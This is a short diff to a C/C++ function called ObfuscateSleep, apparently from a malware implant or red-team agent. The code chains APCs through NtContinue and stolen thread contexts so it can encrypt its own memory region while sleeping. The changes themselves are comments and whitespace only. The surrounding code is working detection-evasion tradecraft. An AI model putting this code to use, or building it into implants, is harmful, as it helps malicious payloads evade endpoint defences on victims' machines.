@@ -119,6 +119,8 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
     rop_buffer->Rdx             = false;
     rop_buffer->R8              = NULL;
 
+    // NOTE: hey dummy, the return is pushed onto the stack first + 32 bytes of empty space.
+    // just because 5+ arguments go onto the stack doesn't mean that they're first...
     *(uintptr_t*)(rop_buffer->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 #else
     *rop_buffer                 = *stolen;
@@ -149,7 +151,21 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
     x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) Ctx->nt.NtContinue, rop_set, nullptr, nullptr));
     rop_enc = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
-    // TODO: this is totally wrong according to MSDN
+    /*
+    __kernel_entry NTSTATUS NtDeviceIoControlFile(
+        [in]  HANDLE           FileHandle,
+        [in]  HANDLE           Event,
+        [in]  PIO_APC_ROUTINE  ApcRoutine,
+        [in]  PVOID            ApcContext,
+        [out] PIO_STATUS_BLOCK IoStatusBlock,
+        [in]  ULONG            IoControlCode,
+        [in]  PVOID            InputBuffer,
+        [in]  ULONG            InputBufferLength,
+        [out] PVOID            OutputBuffer,
+        [in]  ULONG            OutputBufferLength
+    );
+    */
+
     *rop_enc = *stolen;
     rop_enc->ContextFlags = CONTEXT_FULL;
     rop_enc->Rsp          = U_PTR(stolen->Rsp - 0x2000);
@@ -167,17 +183,17 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
     *(uintptr_t*)(rop_enc->Rsp + 0x48) = (uintptr_t) target_region;
     *(uintptr_t*)(rop_enc->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_enc, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) Ctx->nt.NtContinue, rop_enc, NULL, NULL));
     context_cap = (CONTEXT*) Malloc(sizeof(CONTEXT));
     cap_mem     = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
-    *context_cap = *stolen;
-    cap_mem->ContextFlags     = CONTEXT_FULL;
-    context_cap->ContextFlags = CONTEXT_FULL;
-    context_cap->Rsp          = U_PTR( stolen->Rsp );
-    context_cap->Rip          = U_PTR( Ctx->nt.NtGetContextThread );
-    context_cap->Rcx          = U_PTR( src_thread );
-    context_cap->Rdx          = U_PTR( cap_mem );
+    *context_cap                = *stolen;
+    cap_mem->ContextFlags       = CONTEXT_FULL;
+    context_cap->ContextFlags   = CONTEXT_FULL;
+    context_cap->Rsp            = U_PTR( stolen->Rsp );
+    context_cap->Rip            = U_PTR( Ctx->nt.NtGetContextThread );
+    context_cap->Rcx            = U_PTR( src_thread );
+    context_cap->Rdx            = U_PTR( cap_mem );
 
     *(uintptr_t*)(context_cap->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
